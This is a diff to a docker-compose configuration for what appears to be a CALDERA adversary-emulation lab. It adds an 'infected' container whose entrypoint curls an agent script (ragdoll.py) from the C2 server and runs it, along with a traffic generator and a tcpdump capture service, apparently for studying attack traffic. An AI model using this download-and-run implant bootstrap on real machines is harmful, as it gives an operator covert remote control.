@@ -6,14 +6,30 @@ services:
     tty: true
     ports:
       - "8888:8888"
-
-  machine:
+      
+  infected:
     depends_on:
       - caldera
     image: python:3
     stdin_open: true
     tty: true
     entrypoint: [ "bash", "-c", "sleep 30; server=\"http://caldera:8888\"; curl -s -X POST -H \"file:ragdoll.py\" -H \"platform:linux\" http://caldera:8888/file/download > ragdoll.py; pip install requests beautifulsoup4; python ragdoll.py -W http://caldera:8888/weather" ]
+
+  machine:
+    depends_on:
+      - caldera
+    image: traffic-generator:latest
+    stdin_open: true
+    tty: true
+    entrypoint: [ "bash", "-c", "python /web-traffic-generator/gen.py" ]
+
+  tcpdump:
+    depends_on:
+      - caldera
+    image: kaazing/tcpdump
+    network_mode: "host"
+    volumes:
+      - ./tcpdump:/tcpdump
 
 networks:
   default:
